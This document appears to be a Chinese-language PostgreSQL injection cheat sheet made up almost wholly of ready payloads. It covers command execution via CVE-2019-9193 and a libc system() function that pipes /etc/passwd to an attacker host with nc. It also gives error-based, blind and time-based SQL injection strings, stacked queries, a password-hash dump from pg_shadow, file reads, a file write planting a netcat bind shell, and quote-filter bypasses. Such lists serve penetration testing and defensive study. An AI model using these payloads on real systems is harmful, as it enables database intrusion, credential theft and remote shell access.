# postgresql

## PostgreSQL 命令执行

### CVE-2019–9193

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

## 使用 libc.so.6

```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## PostgreSQL 注释

```
--
/**/
```

## PostgreSQL 链注入点符号

```
; #用于终止 SQL 命令。在语句中唯一可使用的位置是在字符串常量或引用标识符中。
|| #或语句

# 使用示例: 
/?whatever=1;(select 1 from pg_sleep(5))
/?whatever=1||(select 1 from pg_sleep(5))
```

## PostgreSQL 版本

```
SELECT version()
```

## PostgreSQL 当前用户

```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## PostgreSQL 用户列表

```
SELECT usename FROM pg_user
```

## PostgreSQL 密码哈希列表

```
SELECT usename, passwd FROM pg_shadow 
```

## 查询数据库管理员账户列表

```
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

## PostgreSQL 权限列表

```
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

## 查询当前用户是否为超级用户

```
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## PostgreSQL 数据库名称

```
SELECT current_database()
```

## PostgreSQL 数据库列表

```
SELECT datname FROM pg_database
```

## PostgreSQL 表格列表

```
SELECT table_name FROM information_schema.tables
```

## PostgreSQL 列表列

```
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## PostgreSQL 报错注入

```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## PostgreSQL XML 帮助器

```
select query_to_xml('select * from pg_user',true,true,''); -- 返回所有结果作为单个 xml 行
select database_to_xml(true,true,''); -- 将当前数据库转储为 XML
select database_to_xmlschema(true,true,''); -- 将当前数据库转储为 XML 架构
```

## PostgreSQL 盲注

```
' and substr(version(),1,10) = 'PostgreSQL' and '1' -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1' -> KO
```

## PostgreSQL 时间盲注

```
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))

select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1

AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL 堆叠查询

```
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

## PostgreSQL 文件读取

```
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

## PostgreSQL 文件写入

```
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

## 绕过过滤器

引号

使用 CHR

```
SELECT CHR(65)||CHR(66)||CHR(67);
```

使用 $ 符号（适用于 PostgreSQL 8及以上版本）

```
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```